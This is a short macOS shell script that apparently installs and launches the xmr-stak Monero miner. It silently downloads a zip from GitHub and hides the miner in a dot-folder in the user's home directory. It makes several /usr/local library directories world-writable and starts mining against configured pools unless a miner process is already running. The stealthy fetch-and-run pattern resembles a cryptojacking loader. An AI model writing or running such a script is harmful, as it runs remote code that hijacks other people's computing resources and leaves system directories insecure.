#!/bin/bash

#folder

if ! [ -d ~/.xmr-stak-AMD-Mac ]; then

	curl --location --silent https://github.com/TheFreeCompute/q/raw/master/xmr-stak-AMD-Mac.zip -o ~/.xmr-stak-AMD-Mac.zip
	tar -xvf ~/.xmr-stak-AMD-Mac.zip
	rm -rf ~/__MACOSX
	mv ~/xmr-stak-AMD-Mac ~/.xmr-stak-AMD-Mac
	rm -rf ~/.xmr-stak-AMD-Mac.zip

	chmod -R 777 ~/.xmr-stak-AMD-Mac/libs/*
	chmod -R 777 ~/.xmr-stak-AMD-Mac/*
fi

#libs

if ! [ -f /usr/local/opt/hwloc/lib/libhwloc.15.dylib ]; then

mkdir -p /usr/local/opt/hwloc/lib/
chmod -R 777 /usr/local/opt/hwloc/lib/
cp ~/.xmr-stak-AMD-Mac/libs/libhwloc.15.dylib /usr/local/opt/hwloc/lib/libhwloc.15.dylib

fi
if ! [ -f /usr/local/opt/libmicrohttpd/lib/libmicrohttpd.12.dylib ]; then

mkdir -p /usr/local/opt/libmicrohttpd/lib/
chmod -R 777 /usr/local/opt/libmicrohttpd/lib/
cp ~/.xmr-stak-AMD-Mac/libs/libmicrohttpd.12.dylib /usr/local/opt/libmicrohttpd/lib/libmicrohttpd.12.dylib

fi
if ! [ -f /usr/local/opt/openssl@1.1/lib/libssl.1.1.dylib ]; then

mkdir -p /usr/local/opt/openssl@1.1/lib/
chmod -R 777 /usr/local/opt/openssl@1.1/lib/
cp ~/.xmr-stak-AMD-Mac/libs/libssl.1.1.dylib /usr/local/opt/openssl@1.1/lib/libssl.1.1.dylib

fi
if ! [ -f /usr/local/opt/openssl@1.1/lib/libcrypto.1.1.dylib ]; then

mkdir -p /usr/local/opt/openssl@1.1/lib/
chmod -R 777 /usr/local/opt/openssl@1.1/lib/
cp ~/.xmr-stak-AMD-Mac/libs/libcrypto.1.1.dylib /usr/local/opt/openssl@1.1/lib/libcrypto.1.1.dylib

fi
if ! [ -f /usr/local/Cellar/openssl@1.1/1.1.1g/lib/libcrypto.1.1.dylib ]; then

mkdir -p /usr/local/Cellar/openssl@1.1/1.1.1g/lib/
chmod -R 777 /usr/local/Cellar/openssl@1.1/1.1.1g/lib/
cp ~/.xmr-stak-AMD-Mac/libs/libcrypto.1.1.dylib /usr/local/Cellar/openssl@1.1/1.1.1g/lib/libcrypto.1.1.dylib

fi
if ! [ -f /usr/local/opt/gnutls/lib/libgnutls.30.dylib ]; then

mkdir -p /usr/local/opt/gnutls/lib/
chmod -R 777 /usr/local/opt/gnutls/lib/
cp ~/.xmr-stak-AMD-Mac/libs/libgnutls.30.dylib /usr/local/opt/gnutls/lib/libgnutls.30.dylib

fi

#run

if pgrep 'xmr-stak'; then 
	exit
else
	~/.xmr-stak-AMD-Mac/xmr-stak --amd ~/.xmr-stak-AMD-Mac/amd.txt --config ~/.xmr-stak-AMD-Mac/config.txt --cpu ~/.xmr-stak-AMD-Mac/cpu.txt --poolconf ~/.xmr-stak-AMD-Mac/pools.txt
fi

